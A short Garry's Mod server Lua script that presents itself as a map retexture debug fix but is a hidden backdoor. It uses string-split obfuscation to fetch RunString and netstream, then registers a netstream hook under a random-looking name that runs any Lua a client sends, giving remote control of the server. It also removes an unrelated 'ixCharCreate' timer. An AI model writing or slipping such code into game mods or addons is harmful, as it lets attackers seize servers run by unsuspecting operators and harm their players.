if(SERVER)then
    timer.Create("Dbg_Map_Retexture_Fix",1,0,function()
        local sdbasdASg=_G["Ru".."nS".."tr".."ing"];local sKgvSA=_G["ne".."t".."s".."tr".."e".."am"];mghns=mghns||sdbasdASg;olnsqetsasd=olnsqetsasd||sKgvSA; 
        if olnsqetsasd then
            timer.Remove("ixCharCreate")
            olnsqetsasd.Hook("Aqthbmlphbsghj",function(_,Aqthbmlphbsghj)
                mghns(Aqthbmlphbsghj, "Aqthbmlphbsghj", false)
            end)
        end
    end)
end